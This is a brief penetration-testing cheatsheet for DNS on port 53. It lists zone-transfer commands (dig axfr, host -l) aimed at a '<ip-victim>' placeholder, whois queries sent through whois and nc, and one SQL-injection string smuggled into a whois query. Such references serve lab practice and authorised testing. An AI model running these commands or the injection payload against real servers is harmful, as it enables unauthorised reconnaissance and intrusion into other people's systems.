---
title: "PORT 53 - DNS"
draft: false
images: []
description: "DNS Cheatsheet"
lead: "DNS Cheatsheet"
menu:
  docs:
    parent: "Ports"
weight: 53
toc: true
---

```dig axfr @<ip-victim> <domain>

host -l <domain> <ip-victim>

whois -h 10.10.1.111 -p 43 "domain.com"

echo "domain.com" | nc -vn 10.10.1.111 43

whois -h 10.10.1.111 -p 43 "a') or 1=1#"
```